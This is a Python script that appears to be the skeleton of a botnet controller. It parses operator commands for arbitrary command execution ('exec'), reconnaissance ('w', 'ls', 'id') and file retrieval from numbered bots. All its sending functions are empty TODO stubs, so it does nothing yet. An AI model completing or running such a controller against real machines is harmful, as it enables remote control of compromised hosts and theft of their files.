import argparse
import utils
from utils import Command


def error():
    print("Bad input")  # TODO


def heartbeat():
    # TODO
    return


def send_command(botid, cmd, data, respond):
    # TODO
    return


def request_file(botid, filepath, respond):
    # TODO
    return


def handle_input(args):
    if args.command == 'heartbeat' or args.command == 'hb':
        return heartbeat()

    if args.bot <= 0: return error()
    respond = not args.silent

    if args.command == 'cmd' or args.command == 'exec':
        if (args.data == ''): return error()
        return send_command(args.bot, Command.CMD, args.data, respond)

    elif args.command == 'w':
        return send_command(args.bot, Command.CMD, 'w', respond)

    elif args.command == 'ls':
        if (args.data == ''): return error()
        return send_command(args.bot, Command.CMD, 'ls ' + args.data, respond)

    elif args.command == 'id':
        return send_command(args.bot, Command.CMD, 'id', respond)

    elif args.command == 'req_file' or args.command == 'rf':
        if (args.data == ''): return error()
        return request_file(args.bot, args.data, respond)


if __name__ == "__main__":
    utils.init_config()

    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=[
            'heartbeat', 'hb',
            'cmd', 'exec',
            'w', 'ls', 'id',
            'req_file', 'rf',
        ])
    parser.add_argument('-d', '--data', default='')
    parser.add_argument('-b', '--bot', default=0, type=int)
    parser.add_argument('-s', '--silent', action='store_true')

    args = parser.parse_args()
    # print(args.command)
    # print(args.data)
    # print(args.bot)
    # print(args.silent)

    handle_input(args)
